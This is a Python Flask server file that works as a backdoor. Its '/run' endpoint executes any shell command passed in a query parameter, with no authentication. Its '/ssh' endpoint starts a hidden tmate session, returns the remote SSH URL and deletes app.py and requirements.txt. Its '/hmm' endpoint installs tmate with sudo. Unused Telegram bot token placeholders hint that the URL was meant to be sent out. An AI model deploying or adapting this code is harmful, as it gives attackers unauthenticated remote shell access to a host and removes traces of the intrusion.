import subprocess
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route('/', methods=['GET'])
def root_endpoint():
    return 'Server is up'

@app.route('/ssh', methods=['GET'])
def ssh_endpoint():
    script = '''
    #!/bin/bash

    BOT_TOKEN="YOUR_BOT_TOKEN"
    CHAT_ID="YOUR_CHAT_ID"

    tmate_output=$(nohup tmate -S /tmp/tmate.sock new-session -d </dev/null >/dev/null 2>&1 &)
    tmate -S /tmp/tmate.sock wait tmate-ready

    sleep 5

    ssh_url=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")

    echo $ssh_url > /tmp/tmate_ssh_url.txt
    echo "Done"

    # Remove app.py and requirements.txt
    rm -f app.py requirements.txt
    '''

    subprocess.run(script, shell=True)

    with open('/tmp/tmate_ssh_url.txt', 'r') as file:
        ssh_url = file.read().strip()

    return jsonify({'ssh_url': ssh_url})

@app.route('/hmm', methods=['GET'])
def install_tmate():
    script = '''
    sudo apt-get update
    sudo apt-get install tmate -y
    '''
    subprocess.run(script, shell=True)
    return 'Tmate installed successfully'

@app.route('/run', methods=['GET'])
def run_command():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return 'No command provided'

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return jsonify({'output': result.stdout})

if __name__ == '__main__':
    app.run()
